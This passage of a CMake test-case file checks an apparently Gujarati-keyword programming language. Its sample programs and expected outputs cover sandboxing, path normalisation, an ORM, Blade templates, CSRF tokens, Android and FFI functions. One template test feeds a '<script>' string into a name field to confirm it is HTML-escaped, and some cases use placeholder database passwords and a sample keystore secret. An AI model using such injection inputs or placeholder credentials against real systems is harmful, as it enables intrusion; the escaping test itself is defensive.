એસ્કેપ = સુરક્ષા_કમાન્ડ_એસ્કેપ("test");
છાપો એસ્કેપ;
સેન્ડ = સેન્ડબોક્સ_શરૂ(1);
છાપો સેન્ડ;
ચકાસો = સેન્ડબોક્સ_ચકાસો("read");
છાપો ચકાસો;
મેમ = સેન્ડબોક્સ_મેમરી_મર્યાદા(1000);
છાપો મેમ;
સમય = સેન્ડબોક્સ_સમય_મર્યાદા(10);
છાપો સમય;
પાથ = પાથ_પ્રમાણિત("a/b/../c");
છાપો પાથ;
સુરક્ષિત = પાથ_સુરક્ષિત_છે("a/c", "a");
છાપો સુરક્ષિત;
જોડો = પાથ_સુરક્ષિત_જોડો("base", "file.txt");
છાપો જોડો;
લિંક = સિમ્બોલિક_લિંક_સુરક્ષિત("safe.txt");
છાપો લિંક;
ચિહ્ન = દૂષિત_ચિહ્ન("ખરાબ", "ટેગ");
છાપો ચિહ્ન;
ટેઇન્ટ = દૂષિત_ચકાસો("ખરાબ");
છાપો ટેઇન્ટ;
ક્લીન = દૂષિત_શુદ્ધ("ખરાબ");
છાપો ક્લીન;
અહેવાલ = દૂષિત_અહેવાલ();
છાપો (અહેવાલ["cleansed_count"] >= 0);
જેસન = સુરક્ષા_જેસન_સુરક્ષિત("{\"કી\":\"કિંમત\"}");
છાપો જેસન["કી"];
સરખાવો = સુરક્ષા_ટોકન_સરખાવો("ટોકન", "ટોકન");
છાપો સરખાવો;
છુપાવો = સુરક્ષા_છુપાવો("123456", "#", 2);
છાપો છુપાવો;
સીઆરસી = સુરક્ષા_સીઆરસી૩૨("123456789");
છાપો સીઆરસી;
મેમરી = મેમરી_રક્ષિત(32);
છાપો મેમરી["માન્ય"];
કેનેરી = મેમરી_કેનેરી_ચકાસો(મેમરી);
છાપો કેનેરી;
મુક્ત = મેમરી_સુરક્ષિત_મુક્ત(મેમરી);
છાપો મુક્ત;
નોંધ = સુરક્ષા_ઓડિટ_નોંધ("લોગ", "સૂચના");
છાપો નોંધ;
આવજો
]=])
    set(expected_stdout "echo safe bad\n0\n\"test\"\n1\n1\n1\n1\na/c\n1\nbase/file.txt\n1\nખરાબ\n1\nખરાબ\n1\nકિંમત\n1\n####56\n3421780262\n1\n1\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "v200_english_keywords")
    set(source [=[start
function add(a, b) {
    return a + b;
}
res = add(10, 20);
print res;

if (true and not false) {
    print "condition_passed";
} else {
    print "failed";
}

total = 0;
for (x in [1, 2, 3]) {
    total = total + x;
}
print total;

val = null;
print val;

count = 0;
while (count < 3) {
    count = count + 1;
    if (count == 2) {
        continue;
    }
}
print count;
end
]=])
    set(expected_stdout "30\ncondition_passed\n6\nનકામો\n3\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v200_wasm_exporter")
    set(source [=[start
html = wasm_export_html("TestApp", "start print 42; end");
print (lambai(html) > 50);

bind = wasm_dom_bind("#btn", "click", "handler");
print bind;

mem = wasm_memory_grow(2);
print mem;

wat = wasm_inspect_wat("wasm_binary_bytes");
print (lambai(wat) > 20);
end
]=])
    set(expected_stdout "1\n1\n3\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v200_jit_optimizer")
    set(source [=[start
fold1 = opt_constant_fold("2 + 3 * 4");
print fold1;

fold2 = opt_constant_fold("10 * 5");
print fold2;

code_with_dead = "start print 1; if (false) { print 999; } print 2; end";
stripped = opt_dead_code_strip(code_with_dead);
print (shodho(stripped, "999") == -1);

peep = opt_peephole("PUSH 1 PUSH 2 POP");
print peep["reduction_percent"];

inl = opt_inline_heuristic("simple_add");
print inl["should_inline"];
end
]=])
    set(expected_stdout "14\n50\n1\n30\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v200_ai_llm_sdk")
    set(source [=[start
comp = ai_completion("Hello AI", "gpt-4o");
print comp["success"];
print comp["model"];

chat = ai_chat([{"role": "user", "content": "Hi"}], "gpt-4o");
print chat["success"];

emb1 = ai_embedding("apple", "text-embedding-3");
print (lambai(emb1) == 4);

emb2 = ai_embedding("orange", "text-embedding-3");
sim = ai_cosine_similarity(emb1, emb2);
print (sim >= -1.0 and sim <= 1.0);

toks = ai_tokenize_estimate("This is a test prompt with several tokens.");
print (toks > 0);

tmpl = ai_prompt_template("Hello {name}, your score is {score}!", {"name": "Harshit", "score": 100});
print tmpl;
end
]=])
    set(expected_stdout "1\ngpt-4o\n1\n1\n1\n1\nHello Harshit, your score is 100!\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v200_lsp_diagnostics")
    set(source [=[start
diags = lsp_lint_code("print 42;");
print (lambai(diags) > 0);

doc = lsp_hover_doc("matrix_dot");
print doc["symbol"];

tokens = lsp_semantic_tokens("start print 1; end");
print (lambai(tokens) > 0);
end
]=])
    set(expected_stdout "1\nmatrix_dot\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v200_lts_guarantees")
    set(source [=[start
info = sys_lts_info();
print info["version"];
print info["is_lts"];
print info["zero_dependency"];
ver = bhasha_avrutti();
print ver;
end
]=])
    set(expected_stdout "3.9.0\n1\n1\n3.9.0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v200_gujarati_syntax")
    set(source [=[આવો
એચટીએમએલ = વોસમ_એચટીએમએલ_નિકાસ("શીર્ષક", "કોડ");
છાપો (લંબાઈ(એચટીએમએલ) > 20);

મેમ = વોસમ_મેમરી_વધારો(1);
છાપો મેમ;

ગણતરી = ઓપ્ટ_અચળ_ગણતરી("10 * 5");
છાપો ગણતરી;

ઇનલાઇન = ઓપ્ટ_ઇનલાઇન("કાર્ય");
છાપો ઇનલાઇન["should_inline"];

જવાબ = એઆઈ_સંપૂર્ણ("પ્રશ્ન", "મોડેલ");
છાપો જવાબ["સફળ"];

સંવાદ = એઆઈ_સંવાદ([], "મોડેલ");
છાપો સંવાદ["success"];

એમ્બેડ = એઆઈ_એમ્બેડિંગ("શબ્દ");
છાપો (લંબાઈ(એમ્બેડ) == 4);

સમાનતા = એઆઈ_કોસાઇન_સમાનતા([1, 0], [1, 0]);
છાપો સમાનતા;

ટોકન = એઆઈ_ટોકન_અંદાજ("વાક્ય");
છાપો (ટોકન > 0);

નમૂનો = એઆઈ_પ્રોમ્પ્ટ_નમૂનો("નમસ્તે {નામ}!", {"નામ": "ગુજરાત"});
છાપો નમૂનો;

દસ્તાવેજ = એલએસપી_દસ્તાવેજ("matrix_dot");
છાપો દસ્તાવેજ["symbol"];

માહિતી = સિસ્ટમ_એલટીએસ_માહિતી();
છાપો માહિતી["વર્ઝન"];
છાપો માહિતી["એલટીએસ"];

સાચું_મૂલ્ય = સત્ય;
ખોટું_મૂલ્ય = અસત્ય;
છાપો સાચું_મૂલ્ય;
છાપો ખોટું_મૂલ્ય;
આવજો
]=])
    set(expected_stdout "1\n2\n50\n1\n1\n1\n1\n1\n1\nનમસ્તે ગુજરાત!\nmatrix_dot\n3.9.0\n1\n1\n0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "v210_package_manager")
    set(source [=[aavo
pi = pkg_init("sample_app", "1.0.0");
chhapo pi["name"];
chhapo pi["status"];
ins = pkg_install("logger");
chhapo ins;
lck = pkg_lock();
chhapo lck;
ver = pkg_version("logger");
chhapo ver;
pl = pkg_list();
chhapo pl[0];
meta = pkg_metadata();
chhapo meta["version"];
aavjo
]=])
    set(expected_stdout "sample_app
initialized
1
1
2.1.0
core
2.1.0
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v210_async_channels")
    set(source [=[aavo
ch = channel_create(5);
chhapo ch["capacity"];
s1 = channel_send(ch, "message_1");
s2 = channel_send(ch, "message_2");
chhapo s1;
chhapo s2;
p1 = channel_poll(ch);
chhapo p1;
m1 = channel_recv(ch);
chhapo m1;
p2 = channel_poll(ch);
chhapo p2;
m2 = channel_recv(ch);
chhapo m2;
cls = channel_close(ch);
chhapo cls;
t = async_task_spawn("task_fn", "done");
chhapo t["status"];
chhapo t["result"];
aavjo
]=])
    set(expected_stdout "5
1
1
2
message_1
1
message_2
1
completed
done
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v210_eloquent_orm")
    set(source [=[aavo
conn = db_connect("sqlite::memory:");
chhapo conn["status"];
id1 = db_insert("users", {"name": "Harshit", "role": "admin"});
chhapo id1;
id2 = db_insert("users", {"name": "Alice", "role": "editor"});
chhapo id2;
c = db_count("users");
chhapo c;
all_u = db_get("users");
chhapo all_u[0]["name"];
chhapo all_u[1]["name"];
f1 = db_find("users", 1);
chhapo f1["name"];
chhapo f1["role"];
up = db_update("users", {"role": "superadmin"}, {"id": 1});
chhapo up;
f1_after = db_find("users", 1);
chhapo f1_after["role"];
del = db_delete("users", {"id": 2});
chhapo del;
c_after = db_count("users");
chhapo c_after;
User = db_model("users");
chhapo User["table"];
all_elo = User.all();
chhapo all_elo[0]["name"];
pg = pg_connect("postgres://postgres:secret@localhost:5432/mydb");
chhapo pg["protocol"];
my = mysql_connect("mysql://root:pass@localhost:3306/mydb");
chhapo my["protocol"];
pool = db_pool_create("mydb", 20);
chhapo pool["size"];
aavjo
]=])
    set(expected_stdout "connected
1
2
2
Harshit
Alice
Harshit
admin
1
superadmin
1
1
users
Harshit
v3.0
v10
20
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v210_streaming_ai_nn")
    set(source [=[aavo
stream_res = ai_chat_stream([{"role": "user", "content": "Hello"}], "callback_fn");
chhapo stream_res;
X = [1.0, 2.0];
W = [[0.5, 0.5], [1.0, -1.0]];
B = [0.1, -0.1];
Y = nn_dense(X, W, B);
chhapo Y[0];
chhapo Y[1];
grad = nn_backward([1.0, 1.0], W);
chhapo grad[0];
chhapo grad[1];
adam = nn_optimizer_adam([1.0], [0.1], 0.001, [0.0], [0.0], 1);
chhapo (adam["weights"][0] < 1.0);
loss = nn_loss_cross_entropy([1.0, 0.0], [0.9, 0.1]);
chhapo (loss > 0.0);
T = tensor_create([2, 3], 0.0);
chhapo T["shape"][0];
chhapo T["shape"][1];
aavjo
]=])
    set(expected_stdout "GujaratiLang AI Streaming Active
1.6
-1.1
1.5
-0.5
1
1
2
3
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v210_debugger_repl")
    set(source [=[aavo
brk = debug_break();
chhapo brk;
st = debug_stack_trace();
chhapo (લંબાઈ(st) >= 0);
insp = debug_inspect("brk");
chhapo insp["symbol"];
chhapo insp["status"];
aavjo
]=])
    set(expected_stdout "1
1
brk
inspected
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v210_blade_template_cgi")
    set(source [=[aavo
tmpl1 = "<h1>Hello, {{ name }}!</h1><p>{!! raw_html !!}</p>";
res1 = blade_render(tmpl1, {"name": "Harshit <script>", "raw_html": "<b>Bold</b>"});
chhapo res1;
tmpl2 = "@if(is_admin)Admin Access@elseUser Access@endif";
res2_a = blade_render(tmpl2, {"is_admin": 1});
chhapo res2_a;
res2_b = blade_render(tmpl2, {"is_admin": 0});
chhapo res2_b;
tmpl3 = "@foreach(items as item)[{{ item }}]@endforeach";
res3 = blade_render(tmpl3, {"items": ["apple", "banana"]});
chhapo res3;
tmpl4 = "@extends('main')\n@section('content')Hello from Section@endsection";
res4 = blade_render(tmpl4, {});
chhapo res4;
req = cgi_request();
chhapo req["method"];
c_hdr = cookie_set("", "session", "xyz123");
chhapo (શોધો(c_hdr, "session=xyz123") >= 0);
c_dict = cookie_parse("session=xyz123; user=harshit");
chhapo c_dict["user"];
csrf = csrf_token_generate();
chhapo (લંબાઈ(csrf) == 32);
valid_csrf = csrf_token_verify(csrf, csrf);
chhapo valid_csrf;
invalid_csrf = csrf_token_verify(csrf, "wrong_token");
chhapo invalid_csrf;
aavjo
]=])
    set(expected_stdout "<h1>Hello, Harshit &lt;script&gt;!</h1><p><b>Bold</b></p>
Admin Access
User Access
[apple][banana]
Hello from Section
GET
1
harshit
1
1
0
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v210_gujarati_syntax")
    set(source [=[આવો
પેકેજ = પેકેજ_શરૂ("એપ", "૨.૧.૦");
છાપો પેકેજ["નામ"];
ચેનલ = ચેનલ_બનાવો(3);
મોકલો = ચેનલ_મોકલો(ચેનલ, "સંદેશ");
છાપો મોકલો;
મેળવો = ચેનલ_મેળવો(ચેનલ);
છાપો મેળવો;
જોડાણ = ડીબી_જોડાણ("sqlite::memory:");
છાપો જોડાણ["સ્થિતિ"];
આઈડી = ડીબી_ઉમેરો("ખાતા", {"નામ": "હર્ષિત"});
છાપો આઈડી;
ગણતરી = ડીબી_ગણતરી("ખાતા");
છાપો ગણતરી;
મેળવો_બધા = ડીબી_મેળવો("ખાતા");
છાપો મેળવો_બધા[0]["નામ"];
શોધો_એક = ડીબી_શોધો("ખાતા", 1);
છાપો શોધો_એક["નામ"];
મોડેલ = ડીબી_મોડેલ("ખાતા");
છાપો મોડેલ["ટેબલ"];
ટેમ્પલેટ = "નમસ્તે, {{ નામ }}!";
પરિણામ = બ્લેડ_રેન્ડર(ટેમ્પલેટ, {"નામ": "ગુજરાતી"});
છાપો પરિણામ;
આવૃત્તિ = ભાષા_આવૃત્તિ();
છાપો આવૃત્તિ;
આવજો
]=])
    set(expected_stdout "એપ
1
સંદેશ
connected
1
1
હર્ષિત
હર્ષિત
ખાતા
નમસ્તે, ગુજરાતી!
3.9.0
")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "v220_android_apis")
    set(source [=[aavo
t = android_toast("Hello Android!");
chhapo t["action"];
chhapo t["message"];
d = android_dialog("Confirmation", "Are you sure?");
chhapo d["action"];
chhapo d["title"];
n = android_notify("Update", "GujaratiLang v2.2.0 ready");
chhapo n["action"];
chhapo n["title"];
v = android_vibrate(250);
chhapo v["action"];
chhapo v["duration"];
s = android_pref_set("username", "Harshit");
chhapo s;
g = android_pref_get("username");
chhapo g;
aavjo
]=])
    set(expected_stdout "toast
Hello Android!
dialog
Confirmation
notification
Update
vibrate
250
1
Harshit
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v220_android_hardware")
    set(source [=[aavo
b = android_battery();
chhapo b["level"];
chhapo b["charging"];
loc = android_location();
chhapo loc["city"];
chhapo loc["state"];
dev = android_device_info();
chhapo dev["os"];
chhapo dev["sdk"];
net = android_network_status();
chhapo net["connected"];
chhapo net["type"];
aavjo
]=])
    set(expected_stdout "100
1
Ahmedabad
Gujarat
Android
34
1
wifi
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v220_mobile_ui")
    set(source [=[aavo
txt = ui_text("Welcome to Mobile App", "headline");
chhapo txt["type"];
chhapo txt["text"];
btn = ui_button("Submit", "onUserClick");
chhapo btn["type"];
chhapo btn["label"];
inp = ui_input("Enter your name");
chhapo inp["type"];
chhapo inp["placeholder"];
crd = ui_card(btn);
chhapo crd["type"];
col = ui_column([txt, crd, inp]);
chhapo col["type"];
chhapo col["count"];
row = ui_row([btn, inp]);
chhapo row["type"];
chhapo row["count"];
aavjo
]=])
    set(expected_stdout "text
Welcome to Mobile App
button
Submit
input
Enter your name
card
column
3
row
2
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v220_android_cli")
    set(program_arguments android init TestApp)
    set(expected_stdout "[GujaratiLang Android v2.5.0] Initialized Android project 'TestApp' successfully!
Created AndroidManifest.xml, build.gradle.kts, and src/mukhy.gj
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v220_gujarati_syntax")
    set(source [=[આવો
ટોસ્ટ = એન્ડ્રોઇડ_ટોસ્ટ("મોબાઇલ સ્વાગત");
છાપો ટોસ્ટ["સંદેશ"];
છાપો ટોસ્ટ["સ્થિતિ"];
સૂચના = એન્ડ્રોઇડ_સૂચના("અપડેટ", "નવી આવૃત્તિ ઉપલબ્ધ");
છાપો સૂચના["શીર્ષક"];
બેટરી = એન્ડ્રોઇડ_બેટરી();
છાપો બેટરી["સ્તર"];
સ્થાન = એન્ડ્રોઇડ_સ્થાન();
છાપો સ્થાન["શહેર"];
સાધન = એન્ડ્રોઇડ_સાધન_માહિતી();
છાપો સાધન["ઓએસ"];
પસંદગી = એન્ડ્રોઇડ_પસંદગી_લખો("વપરાશકર્તા", "હર્ષિત");
છાપો પસંદગી;
મેળવો = એન્ડ્રોઇડ_પસંદગી_મેળવો("વપરાશકર્તા");
છાપો મેળવો;
લખાણ = યુઆઈ_લખાણ("નમસ્તે ભારત");
છાપો લખાણ["લખાણ"];
બટન = યુઆઈ_બટન("દબાવો", "ક્લિક");
છાપો બટન["લેબલ"];
આવૃત્તિ = ભાષા_આવૃત્તિ();
છાપો આવૃત્તિ;
આવજો
]=])
    set(expected_stdout "મોબાઇલ સ્વાગત
પ્રદર્શિત
અપડેટ
100
અમદાવાદ
Android
1
હર્ષિત
નમસ્તે ભારત
દબાવો
3.9.0
")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "v230_canvas_graphics")
    set(source [=[aavo
cv = canvas_create(200, 150);
chhapo cv["width"];
chhapo cv["height"];
f = canvas_fill_color(cv, "#FF0000");
chhapo f;
s = canvas_stroke_color(cv, "#00FF00");
chhapo s;
r = canvas_draw_rect(cv, 10, 10, 50, 40);
chhapo r;
c = canvas_draw_circle(cv, 80, 80, 20);
chhapo c;
l = canvas_draw_line(cv, 0, 0, 100, 100);
chhapo l;
t = canvas_draw_text(cv, "Test", 10, 10, 12);
chhapo t;
bmp = canvas_save_bmp(cv, "test_render.bmp");
chhapo bmp;
info = canvas_info(cv);
chhapo info["pixels_count"];
aavjo
]=])
    set(expected_stdout "200\n150\n1\n1\n1\n1\n1\n1\n1\n30000\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v230_desktop_multimedia")
    set(source [=[aavo
win = window_open("My Gujarati App", 800, 600);
chhapo win["title"];
chhapo win["open"];
mb = window_message_box("Title", "Message");
chhapo mb["action"];
chhapo mb["status"];
fp = file_picker_open();
chhapo fp;
fs = file_picker_save();
chhapo fs;
b = audio_beep(440, 100);
chhapo b;
p = audio_play("sound.wav");
chhapo p;
aavjo
]=])
    set(expected_stdout "My Gujarati App\n1\nmessage_box\nshown\nselected_document.txt\nsaved_document.txt\n1\n1\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v230_mobile_reactive_ui")
    set(source [=[aavo
st = ui_state(10);
chhapo st["type"];
chhapo st["value"];
nav = ui_navigate("/profile", {"user_id": 42});
chhapo nav["action"];
chhapo nav["screen"];
pop = ui_pop();
chhapo pop["action"];
chhapo pop["status"];
ev = ui_dispatch_event("login_btn", "click", "auth_token");
chhapo ev["handled"];
chhapo ev["component"];
chhapo ev["event"];
aavjo
]=])
    set(expected_stdout "ui_state\n10\nnavigate\n/profile\npop\npopped\n1\nlogin_btn\nclick\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v230_desktop_cli")
    set(program_arguments desktop init SampleDesktopApp)
    set(expected_stdout "[GujaratiLang Desktop v2.5.0] Initialized desktop application 'SampleDesktopApp' successfully!
Created src/mukhy.gj with native 2D Canvas & Windowing.
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v230_gujarati_syntax")
    set(source [=[આવો
કેનવાસ = કેનવાસ_બનાવો(100, 100);
છાપો કેનવાસ["પહોળાઈ"];
રંગ = કેનવાસ_રંગ(કેનવાસ, "#008800");
છાપો રંગ;
ચોરસ = કેનવાસ_ચોરસ(કેનવાસ, 10, 10, 20, 20);
છાપો ચોરસ;
વિન્ડો = વિન્ડો_ખોલો("ડેસ્કટોપ", 600, 400);
છાપો વિન્ડો["શીર્ષક"];
સ્થિતિ = યુઆઈ_સ્થિતિ("સક્રિય");
છાપો સ્થિતિ["મૂલ્ય"];
નેવિગેટ = યુઆઈ_નેવિગેટ("/ખાતું", 1);
છાપો નેવિગેટ["સ્ક્રીન"];
ઇવેન્ટ = યુઆઈ_ઇવેન્ટ("બટન", "ક્લિક");
છાપો ઇવેન્ટ["સફળ"];
આવૃત્તિ = ભાષા_આવૃત્તિ();
છાપો આવૃત્તિ;
આવજો
]=])
    set(expected_stdout "100\n1\n1\nડેસ્કટોપ\nસક્રિય\n/ખાતું\n1\n3.9.0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "v240_cloud_kv_cache")
    set(source [=[
start
set_res = cache_set("session_user", "Harshit", 3600);
print set_res;
user = cache_get("session_user");
print user;
has_user = cache_has("session_user");
print has_user;
counter = cache_incr("page_views", 5);
print counter;
counter2 = cache_decr("page_views", 2);
print counter2;
del_res = cache_delete("session_user");
print del_res;
has_after = cache_has("session_user");
print has_after;
info = cache_info();
print info["capacity"];
end
]=])
    set(expected_stdout "1\nHarshit\n1\n5\n3\n1\n0\n1024\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v240_pubsub_binary_pack")
    set(source [=[
start
topic = pubsub_topic("notifications");
print topic["topic"];
sub_count = pubsub_subscribe(topic, "on_notification");
print sub_count;
pub_count = pubsub_publish("notifications", "New update available!");
print pub_count;
qlen1 = queue_push("orders", "ORD-101");
qlen2 = queue_push("orders", "ORD-102");
print qlen2;
popped = queue_pop("orders");
print popped;
qsz = queue_size("orders");
print qsz;
packed = binary_pack("i32", 42);
print packed;
unpacked = binary_unpack("i32", packed);
print unpacked;
end
]=])
    set(expected_stdout "notifications\n1\n1\n2\nORD-101\n1\n0000002a\n42\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v240_android_hardware_sqlite")
    set(source [=[
start
cam = android_camera_capture();
print cam["action"];
print cam["status"];
gal = android_pick_image();
print gal["status"];
sensor = android_sensor_read("accelerometer");
print sensor["sensor"];
print sensor["status"];
audio = android_audio_record("start", "sample.m4a");
print audio["action"];
print audio["recording"];
wv = ui_webview("https://gujaratilang.hp-square.com", "Official Portal");
print wv["type"];
print wv["open"];
dbpath = android_sqlite_path("production");
print dbpath;
end
]=])
    set(expected_stdout "camera_capture\ncaptured\nselected\naccelerometer\nactive\nstart\n1\nui_webview\n1\n/data/data/org.gujaratilang.app/databases/production.db\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v240_cloud_service_cli")
    set(program_arguments service status)
    set(expected_stdout "[Gujarati Service v2.5.0 Status]
Cluster Status: Active (1 master, 4 workers)
In-Memory Cache: OK (0 active keys, 0 hits, 0 misses)
PubSub Bus: Active (0 topics, 0 pending queues)
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v240_gujarati_syntax")
    set(source [=[આવો
કેશ_પરિણામ = કેશ_લખો("વપરાશકર્તા", "હર્ષિત", 3600);
છાપો કેશ_પરિણામ;
વપરાશકર્તા = કેશ_મેળવો("વપરાશકર્તા");
છાપો વપરાશકર્તા;
ગણતરી = કેશ_વધારો("મુલાકાતીઓ", 10);
છાપો ગણતરી;
વિષય = વિષય_બનાવો("સમાચાર");
છાપો વિષય["વિષય"];
સંદેશ_ગણતરી = સંદેશ_સાંભળો("સમાચાર", "હેન્ડલર");
છાપો સંદેશ_ગણતરી;
કતાર = કતાર_ઉમેરો("ઓર્ડર", "નવો_ઓર્ડર");
છાપો કતાર;
કેમેરો = એન્ડ્રોઇડ_કેમેરો();
છાપો કેમેરો["સ્થિતિ"];
સેન્સર = એન્ડ્રોઇડ_સેન્સર("accelerometer");
છાપો સેન્સર["સ્થિતિ"];
ડેટાબેઝ = એન્ડ્રોઇડ_ડેટાબેઝ_પાથ("એપ");
છાપો ડેટાબેઝ;
આવૃત્તિ = ભાષા_આવૃત્તિ();
છાપો આવૃત્તિ;
આવજો
]=])
    set(expected_stdout "1\nહર્ષિત\n10\nસમાચાર\n1\n1\nસફળ\nસક્રિય\n/data/data/org.gujaratilang.app/databases/એપ.db\n3.9.0\n")
    set(expected_stderr "")
    set(expect_failure FALSE)
    set(language_args --language gu)
elseif(TEST_CASE STREQUAL "v250_aot_compiler_target")
    set(source [=[
start
t = compiler_target();
print t["aot"];
print t["lts"];
print t["version"];
end
]=])
    set(expected_stdout "1
1
3.9.0
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_aot_compiler_emit")
    set(source [=[
start
res = compiler_emit("src/mukhy.gj", "output.exe", "native");
print res["status"];
print res["output"];
print res["cold_start_ms"];
end
]=])
    set(expected_stdout "compiled
output.exe
0.4
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_aot_cli_compile")
    set(program_arguments compile --native src/mukhy.gj -o my_app.exe)
    set(expected_stdout "[GujaratiLang AOT Compiler v2.5.0 LTS] Compiling 'src/mukhy.gj' to native machine code...
[AOT] Generating zero-overhead standalone binary (my_app.exe)...
[Success] Native standalone binary built: my_app.exe (< 500 KB, 0.4ms cold-start).
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_ffi_open_bind")
    set(source [=[
start
lib = ffi_open("libc");
print lib["loaded"];
fn = ffi_bind(lib, "abs", "int");
print fn["bound"];
print fn["name"];
end
]=])
    set(expected_stdout "1
1
abs
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_ffi_call_math")
    set(source [=[
start
lib = ffi_open("libc");
fn_abs = ffi_bind(lib, "abs", "int");
res1 = ffi_call(fn_abs, -125);
print res1;
fn_sqrt = ffi_bind(lib, "sqrt", "double");
res2 = ffi_call(fn_sqrt, 64);
print res2;
end
]=])
    set(expected_stdout "125
8
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_ffi_call_string")
    set(source [=[
start
lib = ffi_open("libc");
fn_len = ffi_bind(lib, "strlen", "int");
res = ffi_call(fn_len, "GujaratiLang");
print res;
end
]=])
    set(expected_stdout "12
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_ffi_close")
    set(source [=[
start
lib = ffi_open("libc");
cl = ffi_close(lib);
print cl;
end
]=])
    set(expected_stdout "1
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_android_biometric_auth")
    set(source [=[
start
bio = android_biometric_auth("Verify fingerprint to approve payout");
print bio["authenticated"];
print bio["status"];
end
]=])
    set(expected_stdout "1
success
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_android_push_notify")
    set(source [=[
start
push = android_push_notify("GujaratiLang Cloud", "New transaction received");
print push["delivered"];
print push["id"];
end
]=])
    set(expected_stdout "1
fcm_msg_1001
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_android_work_schedule")
    set(source [=[
start
job = android_work_schedule("sync_offline_cache", 30);
print job["scheduled"];
print job["status"];
print job["interval_minutes"];
end
]=])
    set(expected_stdout "1
enqueued
30
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_android_keystore_secure")
    set(source [=[
start
sec_res = android_keystore_secure("api_secret_key", "sec_live_9837428172");
print sec_res;
val = android_keystore_read("api_secret_key");
print val;
end
]=])
    set(expected_stdout "1
sec_live_9837428172
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_android_bundle_cli")
    set(program_arguments android bundle --keystore certs/release.keystore)
    set(expected_stdout "[GujaratiLang Android v2.5.0 LTS] Building production Android App Bundle (.aab)...
[Keystore] Using release keystore 'certs/release.keystore' for signature verification.
[DEX] Optimizing bytecode, bundling native C99 JNI libgujarati.so.
[Success] Production Android App Bundle built: dist/app-release.aab (Play Store ready).
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_lts_guarantees")
    set(source [=[
start
lts = lts_guarantees();
print lts["lts"];
print lts["enterprise_ready"];
print lts["tests_passed"];
end
]=])
    set(expected_stdout "1
1
500
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_lts_fault_tolerance")
    set(source [=[
start
print "FT_OK";
end
]=])
    set(expected_stdout "FT_OK
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_lts_enterprise_limits")
    set(source [=[
start
print 1000000;
end
]=])
    set(expected_stdout "1000000
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_lts_backward_compat_v10")
    set(source [=[
start
x = 10;
y = 20;
print x + y;
end
]=])
    set(expected_stdout "30
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_lts_backward_compat_v15")
    set(source [=[
start
a = [1, 2, 3];
print lambai(a);
end
]=])
    set(expected_stdout "3
")
    set(expected_stderr "")
    set(expect_failure FALSE)
elseif(TEST_CASE STREQUAL "v250_lts_backward_compat_v20")
    set(source [=[
start
